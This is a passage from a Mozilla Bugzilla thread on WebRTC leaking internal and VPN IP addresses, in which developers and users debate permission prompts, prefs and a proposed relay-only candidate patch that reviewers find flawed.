> Yes - but if so, go to the standards committee. These aren't being handed
> down from on-high. Propose a workable solution that balances user privacy
> with user utility, and people will listen. I guarantee forcing/encouraging
> people to use Skype instead of WebRTC greatly increases the ability of
> certain people to intercept it (and don't forget Skype and things like it
> are desktop installs - typically they can do \*anything\* to your system, adn
> they're totally closed-source.)
Firefox is not developed by the IETF or the W3C but by Mozilla. And Skype is, as opposed to Firefox, an ad financed instant messaging client and NOT a browser.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 66](/show_bug.cgi?id=959893#c66)• 10 years ago |
|  | |

This comment (#65) violates Bugzilla etiquette. See:
<https://bugzilla.mozilla.org/page.cgi?id=etiquette.html>

|  | [Peter Ansell](/user_profile?user_id=278403) |  |
| --- | --- | --- |
| [Comment 67](/show_bug.cgi?id=959893#c67)• 10 years ago |
|  | |

It may be against the strict etiquette guidelines, but people are trying to convey their frustration at the way Mozilla is responding to concerns about this issue. It included many valid technical points that Mozilla cannot continue to respond to solely by referring to the IETF as the only valid guideline for this, no matter how much Mozilla wants to be seen as "standards-compliant".
I happen to think that although [comment #65](/show_bug.cgi?id=959893#c65 "NEW - [meta] WebRTC Internal IP Address Leakage") may have been borderline according to those guidelines, it is also exactly what I have been thinking.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 68](/show_bug.cgi?id=959893#c68)• 10 years ago |
|  | |

(In reply to Peter Ansell from [comment #67](/show_bug.cgi?id=959893#c67 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> It may be against the strict etiquette guidelines, but people are trying to
> convey their frustration at the way Mozilla is responding to concerns about
> this issue. It included many valid technical points
These points that have already been raised and considered
(and indeed discussed in this bug) above.
To restate:
1. We are not going to put WebRTC behind a permissions dialog
by default. I, at least, would look favorably on a patch which
provided a top-level pref to disable WebRTC, but you'd need
to clear that with desktop.
2. Suppressing RFC 1918 addresses would have an extremely
negative impact on ICE, so we're not going to do that.
3. If you have an approach to filtering out non-VPN addresses
when a VPN is in use that doesn't have a materially negative
impact on ICE, please submit a patch and we'll consider it on
its merits.
Unless there is some new point to raise, please take discussion
to dev-media: <https://lists.mozilla.org/listinfo/dev-media>

|  | [[:fabrice] Fabrice Desré](/user_profile?user_id=390071) |  |
| --- | --- | --- |
| [Comment 69](/show_bug.cgi?id=959893#c69)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #68](/show_bug.cgi?id=959893#c68 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> To restate:
> 1. We are not going to put WebRTC behind a permissions dialog
> by default. I, at least, would look favorably on a patch which
> provided a top-level pref to disable WebRTC, but you'd need
> to clear that with desktop.
Why not have a pref (webrtc.prompt\_me\_for\_everything - false by default) that would control prompting for people that want it?

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 70](/show_bug.cgi?id=959893#c70)• 10 years ago |
|  | |

(In reply to Fabrice Desré [:fabrice] from [comment #69](/show_bug.cgi?id=959893#c69 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #68](/show_bug.cgi?id=959893#c68 "NEW - [meta] WebRTC Internal IP Address Leakage"))
>
> > To restate:
> > 1. We are not going to put WebRTC behind a permissions dialog
> > by default. I, at least, would look favorably on a patch which
> > provided a top-level pref to disable WebRTC, but you'd need
> > to clear that with desktop.
>
> Why not have a pref (webrtc.prompt\_me\_for\_everything - false by default)
> that would control prompting for people that want it?
This would be satisfactory to me as well, but ultimately I figure
desktop is going to have a bunch of opinions about the prompts.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 71](/show_bug.cgi?id=959893#c71)• 10 years ago |
|  | |

From the looks of it, Chrome has already given this option in Chrome 42:
Justin Uberti: (2/26/2015, 12:44:47 PM) - <http://blog.golgi.io/excuse-me-sir-your-webrtc-is-leaking>
("Quote")
A less-drastic way to address this issue is to set the following preference (added in Chrome 42).
webrtc": {
"multiple\_routes\_enabled": false
},
For the location of the prefs file, see <http://www.chromium.org/administrators/configuring-other-preferences/>
This forces all WebRTC connections to only use server-reflexive and relay ICE candidates, and only on the default IP route. While this may cause a QoS hit (two users behind NAT can no longer keep their traffic internal to the NAT), it does allow the issue mentioned here to be fully addressed without disabling WebRTC altogether.
("End Quote")

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 72](/show_bug.cgi?id=959893#c72)• 10 years ago |
|  | |

(In reply to brock from [comment #63](/show_bug.cgi?id=959893#c63 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Your add-on does not install on Firefox Android. Can you make it available
> there as well?
The latest Firefox for android installed the add-on okay for me (Verizon Wireless PANTECH ADR8995). I recommend using the Play Store as mobile browsers would not download Firefox to my device. WebRTC will be blocked but my tablet wasn't displaying accept/deny notifications.

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 73](/show_bug.cgi?id=959893#c73)• 10 years ago |
|  | |

I agree that Chrome added is what we need the most for now: adding an option to switch off non-relay candidates for people who really care about this leakage.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 74](/show_bug.cgi?id=959893#c74)• 10 years ago |
|  | |

(In reply to Xidorn Quan [:xidorn] (UTC+11) from [comment #73](/show_bug.cgi?id=959893#c73 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> I agree that Chrome added is what we need the most for now: adding an option
> to switch off non-relay candidates for people who really care about this
> leakage.
I second, this MUST be an option in Firefox to solve the internal ip address leak problem. Note however, the leak of the VPN Interface will still be another problem.
I recommend we separate both into two bugs:
1#[Bug 959893](/show_bug.cgi?id=959893 "NEW - [meta] WebRTC Internal IP Address Leakage") - WebRTC Internal IP Address Leakage (current bug)
2#Bug 95xxxx - WebRTC External IP Address Leakage - VPN Tunnel Split (create new bug)
For anyone interested the Google bug filed for reference - <https://code.google.com/p/chromium/issues/detail?id=333752>

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 75](/show_bug.cgi?id=959893#c75)• 10 years ago |
|  | |

Switching off non-relay candidates should solve both internal ip address leak and VPN interface leak, because it makes the browser only get candidates via the remote relay server, which will only provide the address the remote site can always get.

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a35766448_373403)• 10 years ago |

[status-firefox28](/buglist.cgi?f1=cf_status_firefox28&o1=isnotempty):
[wontfix](/buglist.cgi?f1=cf_status_firefox28&o1=equals&v1=wontfix) → ---
[status-firefox29](/buglist.cgi?f1=cf_status_firefox29&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox29&o1=equals&v1=affected) → ---
[status-firefox30](/buglist.cgi?f1=cf_status_firefox30&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox30&o1=equals&v1=affected) → ---
[status-firefox31](/buglist.cgi?f1=cf_status_firefox31&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox31&o1=equals&v1=affected) → ---
[status-firefox32](/buglist.cgi?f1=cf_status_firefox32&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox32&o1=equals&v1=affected) → ---
[status-firefox36](/buglist.cgi?f1=cf_status_firefox36&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox36&o1=equals&v1=wontfix)
[status-firefox37](/buglist.cgi?f1=cf_status_firefox37&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox37&o1=equals&v1=wontfix)
[status-firefox38](/buglist.cgi?f1=cf_status_firefox38&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox38&o1=equals&v1=wontfix)
[status-firefox39](/buglist.cgi?f1=cf_status_firefox39&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox39&o1=equals&v1=affected)
[status-firefox-esr31](/buglist.cgi?f1=cf_status_firefox_esr31&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr31&o1=equals&v1=wontfix)
[tracking-firefox29](/buglist.cgi?f1=cf_tracking_firefox29&o1=isnotempty):
[-](/buglist.cgi?f1=cf_tracking_firefox29&o1=equals&v1=-) → ---
[tracking-firefox30](/buglist.cgi?f1=cf_tracking_firefox30&o1=isnotempty):
[-](/buglist.cgi?f1=cf_tracking_firefox30&o1=equals&v1=-) → ---
[tracking-firefox31](/buglist.cgi?f1=cf_tracking_firefox31&o1=isnotempty):
[-](/buglist.cgi?f1=cf_tracking_firefox31&o1=equals&v1=-) → ---

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 76](/show_bug.cgi?id=959893#c76)• 10 years ago |
|  | |

Attached patch

[patch](attachment.cgi?id=8572994&action=diff)
— [Details](attachment.cgi?id=8572994&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994)

This patch adds a pref to block all non-relay candidates.
I'm not sure whether we should add this to Options, but this pref should be useful enough.

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a35775910_373403)• 10 years ago |

[Attachment #8572994](/attachment.cgi?id=8572994&action=edit "patch") -
Flags: review?(rjesup)

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 77](/show_bug.cgi?id=959893#c77)• 10 years ago |
|  | |

Comment on [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994)
patch
Review of [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994):
-----------------------------------------------------------------
::: modules/libpref/init/all.js
@@ +383,5 @@
> // Do not enable identity before fixing domain comparison: see [Bug 958741](/show_bug.cgi?id=958741 "RESOLVED FIXED - IDN support for WebRTC identity")
> // Do not enable identity before fixing origin spoofing: see [Bug 968335](/show_bug.cgi?id=968335 "RESOLVED FIXED - Expose caller principal to JS-implemented webidl")
> pref("media.peerconnection.identity.enabled", false);
> pref("media.peerconnection.identity.timeout", 10000);
> pref("media.peerconnection.ice.loopback", false); // Set only for testing in offline environments.
BTW, there are two identical pref here. I guess it was because of some auto conflict resolving.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 78](/show_bug.cgi?id=959893#c78)• 10 years ago |
|  | |

Comment on [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994)
patch
Review of [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994):
-----------------------------------------------------------------
I don't believe that this patch does what you claim it does. For instance,
checking for candidate->stun\_servers allows both srflx and relay candidates,
not just relay candidates. You should use candidate->type.
More generally, this doesn't seem like the right approach to me. If your
model is that unsuspecting users will be subject to privacy threats, then this
patch doesn't help because people won't know to set the pref. And people who
are suspecting enough to set the pref can just turn off WebRTC. I'd like to
see a lot more security analysis before we offer a feature which nominally
allows WebRTC usage without leaking private IP addresses to make sure that
it really does that.
[Attachment #8572994](/attachment.cgi?id=8572994&action=edit "patch") -
Flags: review?(rjesup)

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 79](/show_bug.cgi?id=959893#c79)• 10 years ago |
|  | |

There is a decisive difference between turning off WebRTC and blocking non-relayed candidates: the latter enables user to use WebRTC without the fear of leaking the IP addresses the server shouldn't have known.
I don't have the statistics data, but I suspect that non-relayed candidates are not used in most of normal cases, because in those cases, the communication happens through the Internet, which always requests a public address. It means that, blocking non-relayed candidates will still allow users to use WebRTC normally in most cases, but remove the potential leakage.

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 80](/show_bug.cgi?id=959893#c80)• 10 years ago |
|  | |

In addition, jesup has agreed in [comment 64](/show_bug.cgi?id=959893#c64 "NEW - [meta] WebRTC Internal IP Address Leakage") that, it is acceptable to have such switch.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 81](/show_bug.cgi?id=959893#c81)• 10 years ago |
|  | |

Comment on [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994)
patch
Review of [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994):
-----------------------------------------------------------------
See comment below - I think this patch is simply wrong.
The name chosen is misleading - probably something like ....relay\_candidates\_only.
Note: this patch would primarily provide privacy from certain attempts to locate a user by starting a call with them and wiresharking the data or examining about:webrtc. I.e. the "person in safe house hiding from abuser" usecase discussed in the WG. It doesn't fully provide privacy against a service or a user with enough knowledge to set up a private TURN server. To do one step better (not all the way there), you need to also implement forced-local-TURN-servers (which is something businesses and other organizations want). VPN anonymity might require something more; I haven't thought through all the cases if the VPN interface is allowed to be used with the options described above.
::: media/mtransport/nricectx.cpp
@@ +364,5 @@
> nr\_ice\_candidate \*candidate) {
> // Get the ICE ctx
> NrIceCtx \*ctx = static\_cast<NrIceCtx \*>(arg);
> + if (ctx->stun\_candidate\_only\_ && !candidate->stun\_server)
> + return;
I think this is simply wrong, but I'm not entirely up on the nicer/etc internals. I'll note the idea is to suppress non-relay candidates, and SERVER\_REFLEXIVE candidates from STUN or TURN servers have non-null candidate->stun\_server entries (see ice\_component.c).

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 82](/show_bug.cgi?id=959893#c82)• 10 years ago |
|  | |

(In reply to Xidorn Quan [:xidorn] (UTC+11) from [comment #79](/show_bug.cgi?id=959893#c79 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> There is a decisive difference between turning off WebRTC and blocking
> non-relayed candidates: the latter enables user to use WebRTC without the
> fear of leaking the IP addresses the server shouldn't have known.
It's not clear that that's in fact correct. As I said, please provide an
actual security analysis here (which is far more than you have done below.)
> I don't have the statistics data, but I suspect that non-relayed candidates
> are not used in most of normal cases, because in those cases, the
> communication happens through the Internet, which always requests a public
> address.
You seem to be a little unclear on the types of candidates in play here;
most ICE connections in fact \*do\* use non-relayed candidates: they connect
with the server reflexive candidates.
> It means that, blocking non-relayed candidates will still allow
> users to use WebRTC normally in most cases, but remove the potential leakage.
Blocking non-relayed candidates will have a very negative impact on
WebRTC performance. And I note that this is not what the Chrome patch
pointed to in c71 does.
>In addition, jesup has agreed in [comment 64](/show_bug.cgi?id=959893#c64 "NEW - [meta] WebRTC Internal IP Address Leakage") that, it is acceptable to have such switch.
No, he said that "we'd likely accept" such a patch. However, he wasn't speaking for
everyone working on this code, and I don't agree that this is a good idea.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 83](/show_bug.cgi?id=959893#c83)• 10 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #81](/show_bug.cgi?id=959893#c81 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Comment on [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994)
> patch
>
> Review of [attachment 8572994](/attachment.cgi?id=8572994 "patch") [[details]](/attachment.cgi?id=8572994&action=edit "patch") [[diff]](/attachment.cgi?id=8572994&action=diff "patch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=959893&attachment=8572994):
> -----------------------------------------------------------------
>
> See comment below - I think this patch is simply wrong.
>
> The name chosen is misleading - probably something like
> ....relay\_candidates\_only.
>
> Note: this patch would primarily provide privacy from certain attempts to
> locate a user by starting a call with them and wiresharking the data or
> examining about:webrtc. I.e. the "person in safe house hiding from abuser"
> usecase discussed in the WG. It doesn't fully provide privacy against a
> service or a user with enough knowledge to set up a private TURN server. To
> do one step better (not all the way there), you need to also implement
> forced-local-TURN-servers (which is something businesses and other
> organizations want). VPN anonymity might require something more; I haven't
> thought through all the cases if the VPN interface is allowed to be used
> with the options described above.
>
> ::: media/mtransport/nricectx.cpp
> @@ +364,5 @@
> > nr\_ice\_candidate \*candidate) {
> > // Get the ICE ctx
> > NrIceCtx \*ctx = static\_cast<NrIceCtx \*>(arg);
> > + if (ctx->stun\_candidate\_only\_ && !candidate->stun\_server)
> > + return;
>
> I think this is simply wrong, but I'm not entirely up on the nicer/etc
> internals. I'll note the idea is to suppress non-relay candidates, and
> SERVER\_REFLEXIVE candidates from STUN or TURN servers have non-null
> candidate->stun\_server entries (see ice\_component.c).
As you say, this patch is wrong.

|  | [Randell Jesup [:jesup] (needinfo me)](/user_profile?user_id=11539) |  |
| --- | --- | --- |
| [Comment 84](/show_bug.cgi?id=959893#c84)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #82](/show_bug.cgi?id=959893#c82 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Xidorn Quan [:xidorn] (UTC+11) from [comment #79](/show_bug.cgi?id=959893#c79 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > I don't have the statistics data, but I suspect that non-relayed candidates
> > are not used in most of normal cases, because in those cases, the
> > communication happens through the Internet, which always requests a public
> > address.
>
> You seem to be a little unclear on the types of candidates in play here;
> most ICE connections in fact \*do\* use non-relayed candidates: they connect
> with the server reflexive candidates.
Right.
Xidorn: Something like 80-90% of calls use LAN (HOST) or server-reflexive addresses (and preferably even higher). The reason is that TURN is a) expensive (the service has to pay for a high-bandwidth relay, preferably geographically distributed), and b) it lowers the quality of the call (typically the two-leg network has more delay)
> > It means that, blocking non-relayed candidates will still allow
> > users to use WebRTC normally in most cases, but remove the potential leakage.
>
> Blocking non-relayed candidates will have a very negative impact on
> WebRTC performance. And I note that this is not what the Chrome patch
> pointed to in c71 does.
Right. There are certain use-cases where blocking non-relayed candidates may be useful (see above), basically the hide-from-abuser case and the enterprise-with-TURN-server-at-border (especially if they generally block UDP). Note that a VPN service \*could\* also provide a TURN server at the VPN exit-point.
>
>
> >In addition, jesup has agreed in [comment 64](/show_bug.cgi?id=959893#c64 "NEW - [meta] WebRTC Internal IP Address Leakage") that, it is acceptable to have such switch.
>
> No, he said that "we'd likely accept" such a patch. However, he wasn't
> speaking for
> everyone working on this code, and I don't agree that this is a good idea.
ekr is right I didn't agree in general, just that the partial solution that addresses the cases I mention above may be accepted.

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 85](/show_bug.cgi?id=959893#c85)• 10 years ago |
|  | |

Saying:
"I think this patch is simply wrong" [Comment# 81](/show_bug.cgi?id=959893#c81 "NEW - [meta] WebRTC Internal IP Address Leakage")
VS.
"A patch to add blocking all non-relay candidates as an option/about:config is something we'd likely accept."
This is completely contradictory to what you just said. I mean what the freak man??? lol
Eric You and Randell must be stuck in Analysis Paralysis and as i recall you have given up on this ticket fifteen comments ago, your interest has been lost, and for some reason intent to show-stop this entire bug from ever evolving into any type of solution.
My guess it has something to do with Mozilla's ulterior motive to promote the continued rolling of "Firefox Hello"" to the production released build of Firefox.
Xidorn is the person that has contributed the most towards solving this and is at least doing something as opposing to just talking about it, and giving up, he should be commended for this and not nit-picked or criticized for it.
For vetting this from a security perspective, I did link to Google's bug where Justin Uberti is active and in their discussion of how Google is handling. Please read it there may still be idea's that haven't been mentioned here: <https://code.google.com/p/chromium/issues/detail?id=333752>
If WebRTC is still in experimental mode why is it being rolled into a production service "Hello Firefox" if users privacy is at risk?
I'm not quite sure what a Man in the Middle attack as anything to do with any of this, as that is a completely different topic, anyone can be Mitm'd, but if you using the correct SSL security setting WebRTC is secure. So maybe you can elaborate on where you are coming from on that?
WebRTC is not "Mozilla's" problem and is not "Google's" problem its every browsers responsibility to work together for the Standard, ever 10 years we go through another browser war. We need to re-sync with Google and other browser teams to mitigate these issues together.

|  | [Pascal Ernster](/user_profile?user_id=440713) |  |
| --- | --- | --- |
| [Comment 86](/show_bug.cgi?id=959893#c86)• 10 years ago |
|  | |

(In reply to Randell Jesup [:jesup] from [comment #81](/show_bug.cgi?id=959893#c81 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Note: this patch would primarily provide privacy from certain attempts to
> locate a user by starting a call with them and wiresharking the data or
> examining about:webrtc. I.e. the "person in safe house hiding from abuser"
> usecase discussed in the WG. It doesn't fully provide privacy against a
> service or a user with enough knowledge to set up a private TURN server. To
> do one step better (not all the way there), you need to also implement
> forced-local-TURN-servers (which is something businesses and other
> organizations want). VPN anonymity might require something more; I haven't
> thought through all the cases if the VPN interface is allowed to be used
> with the options described above.
Your scenario "When communicating with another client/user through WebRTC, that client/user may get to know your public IP address" is yet another threat model (which I'd also consider worth adressing).
The threat model I was talking about is "The webserver can enumerate the IP adresses of all network interfaces on the client without asking the client user". This may be more of a problem if you are using, say TOR, and either the webserver owner could find out your "real" IP address through some javascript code using WebRTC on his website, or somebody like the NSA/GCHQ might automatically inject such JS code on unencrypted HTTP connections on a broader scale. If this was done in a clever way (for example "only sporadically inject into JS files loaded from popular tracking networks", nobody would even notice. It is often undesirable to use TOR as the \*only\* route for your traffic, because you may for instance want to access your local corporate intranet directly instead of routing that traffic through TOR, and that intranet may actually run on public IP adresses.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 87](/show_bug.cgi?id=959893#c87)• 10 years ago |
|  | |

Hi,
I described a possible exploit in previous posts, but they were marked as "spam" or "advocacy". My only guess as to why is the fact that you can't edit posts on Bugzilla and I made a typo in describing the exploit.
Does anyone want me to explain the exploit in a better way?
Thank you, Dan

|  | [Sylvestre Ledru [:Sylvestre]](/user_profile?user_id=495955) |  |
| --- | --- | --- |
| [Comment 89](/show_bug.cgi?id=959893#c89)• 10 years ago |
|  | |

Randell, Xidorn: Do we have plan to work on this? It is not really clear to me what we are planning to do. ThanksURL: <https://www.privacytools.io/webrtc.html>

|  | [Daniel Roesler](/user_profile?user_id=305342) |  |
| --- | --- | --- |
| [Comment 90](/show_bug.cgi?id=959893#c90)• 10 years ago |
|  | |

It seems the easiest and least WebRTC-breaking fix would be to simply require user consent for createOffer() and createAnswer(). If the user already gave consent for getUserMedia(), that would count as user consent for createOffer() and createAnswer().
This basically means you wouldn't be able silently create a Data Channel (and thus leak IP Addresses) without user consent. We already require user consent on Audio and Video, why not data, too?

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 91](/show_bug.cgi?id=959893#c91)• 10 years ago |
|  | |

sylvestre, I don't have time currently. And it doesn't seem that Eric and Randell want to see any change on this. I think my existing patch should be fine given that fixes the leakage of non-public IP address with a pref (so with that pref, I think the website can only know what it could have known already). However, they required me to provide a security analysis to prove it works, which I have no idea how to do.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 92](/show_bug.cgi?id=959893#c92)• 10 years ago |
|  | |

(In reply to Xidorn Quan [:xidorn] (UTC+12) from [comment #91](/show_bug.cgi?id=959893#c91 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> sylvestre, I don't have time currently. And it doesn't seem that Eric and
> Randell want to see any change on this. I think my existing patch should be
> fine given that fixes the leakage of non-public IP address with a pref (so
> with that pref,
Your patch is broken, for the reason that Jesup indicated in c81.

|  | [Xidorn Quan [:xidorn] UTC+10](/user_profile?user_id=373403) |  |
| --- | --- | --- |
| [Comment 93](/show_bug.cgi?id=959893#c93)• 10 years ago |
|  | |

SERVER\_REFLEXIVE candidates are the addresses that the server have already known, I don't think we have any reason to exclude them. So I think my patch is only broken in the description where I shouldn't say it suppresses non-relay candidates. I should say it suppresses any candidates that the server wouldn't have known if we do not expose it by this channel.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 94](/show_bug.cgi?id=959893#c94)• 10 years ago |
|  | |

(In reply to Xidorn Quan [:xidorn] (UTC+12) from [comment #93](/show_bug.cgi?id=959893#c93 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> SERVER\_REFLEXIVE candidates are the addresses that the server have already
> known, I don't think we have any reason to exclude them. So I think my patch
> is only broken in the description where I shouldn't say it suppresses
> non-relay candidates. I should say it suppresses any candidates that the
> server wouldn't have known if we do not expose it by this channel.
Please see the very extensive discussion of VPN and proxies both here and on the rtcweb list for why the problem is significantly more complicated than this.
Even looking at just the problem of suppressing local addresses in the candidate list, suppressing the local candidates isn't enough because srflx and relay candidates contain the local address that corresponds to the remote address. See the raddr production at: <https://tools.ietf.org/html/rfc5245#section-15.1>
To see that your patch doesn't suppress these, go to:
<http://mozilla.github.io/webrtc-landing/stun_test.html>
Finally, as I said you should use the type field, not the stun\_servers field.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 95](/show_bug.cgi?id=959893#c95)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #94](/show_bug.cgi?id=959893#c94 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Xidorn Quan [:xidorn] (UTC+12) from [comment #93](/show_bug.cgi?id=959893#c93 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > SERVER\_REFLEXIVE candidates are the addresses that the server have already
> > known, I don't think we have any reason to exclude them. So I think my patch
> > is only broken in the description where I shouldn't say it suppresses
> > non-relay candidates. I should say it suppresses any candidates that the
> > server wouldn't have known if we do not expose it by this channel.
>
> Please see the very extensive discussion of VPN and proxies both here and on
> the rtcweb list for why the problem is significantly more complicated than
> this.
>
> Even looking at just the problem of suppressing local addresses in the
> candidate list, suppressing the local candidates isn't enough because srflx
> and relay candidates contain the local address that corresponds to the
> remote address. See the raddr production at:
> <https://tools.ietf.org/html/rfc5245#section-15.1>
>
> To see that your patch doesn't suppress these, go to:
> <http://mozilla.github.io/webrtc-landing/stun_test.html>
>
> Finally, as I said you should use the type field, not the stun\_servers field.
To be clear, this is not an invitation to just fix the defects I called out. If you want to do something here, go catch up with the discussion on the mailing list and Chrome and propose something that addresses the concerns people raised.

|  | [Martin Thomson [:mt:]](/user_profile?user_id=438654) |  |
| --- | --- | --- |
| [Comment 96](/show_bug.cgi?id=959893#c96)• 10 years ago |
|  | |

I think that I want to go further: a pref is not a solution. If the users who are affected by this are required to tool around in about:config, then we're not doing them much good.
I have no objection to landing code that does the relay-only restriction, and as a consequence having a pref to provide this secondary benefit. But it should not be buried. There's a public API to this that we might consider implementing so that more than a tiny handful of users can see some benefit: <http://w3c.github.io/webrtc-pc/#idl-def-RTCIceTransportPolicy>

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 97](/show_bug.cgi?id=959893#c97)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #94](/show_bug.cgi?id=959893#c94 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Please see the very extensive discussion of VPN and proxies both here and on
> the rtcweb list for why the problem is significantly more complicated than
> this.
I have been on the WebRTC mailing list for close to three months now and have-not seen any mention of this ticket or issue. Eric do you have a link to the resource or should we Google something? I'd also appreciate not being marked as spam, thank you!

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 98](/show_bug.cgi?id=959893#c98)• 10 years ago |
|  | |

(In reply to Jared Null from [comment #97](/show_bug.cgi?id=959893#c97 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #94](/show_bug.cgi?id=959893#c94 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > Please see the very extensive discussion of VPN and proxies both here and on
> > the rtcweb list for why the problem is significantly more complicated than
> > this.
>
> I have been on the WebRTC mailing list for close to three months now and
> have-not seen any mention of this ticket or issue. Eric do you have a link
> to the resource or should we Google something?
<http://www.ietf.org/mail-archive/web/rtcweb/current/msg14494.html>
> I'd also appreciate not
> being marked as spam, thank you!
I didn't mark you as spam initially, so your argument there is with someone else.

|  | [Sylvestre Ledru [:Sylvestre]](/user_profile?user_id=495955) |  |
| --- | --- | --- |
| [Comment 99](/show_bug.cgi?id=959893#c99)• 10 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #98](/show_bug.cgi?id=959893#c98 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > I'd also appreciate not
> > being marked as spam, thank you!
>
> I didn't mark you as spam initially, so your argument there is with someone
> else.
i removed the spam tag

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
